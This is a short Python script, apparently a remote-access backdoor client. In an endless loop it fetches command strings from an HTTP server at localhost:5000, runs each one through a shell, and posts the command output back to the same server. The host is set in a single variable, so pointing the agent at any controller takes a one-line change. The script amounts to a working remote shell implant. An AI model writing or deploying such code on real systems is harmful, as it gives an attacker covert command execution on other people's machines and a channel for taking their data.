
from urllib import request, parse
import subprocess
import time
IP = "localhost"
PORT=5000
def returnoutput(data, url=f'http://{IP}:{PORT}'):
    data = {"return": data}
    data = parse.urlencode(data).encode()
    req = request.Request(url, data=data)
    request.urlopen(req)
def run(command):
     cmd = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     returnoutput(cmd.stdout.read())
     returnoutput(cmd.stderr.read())
while True:
    command = request.urlopen(f"http://localhost:5000").read().decode()
    print(command)
    run(command)
    time.sleep(1)
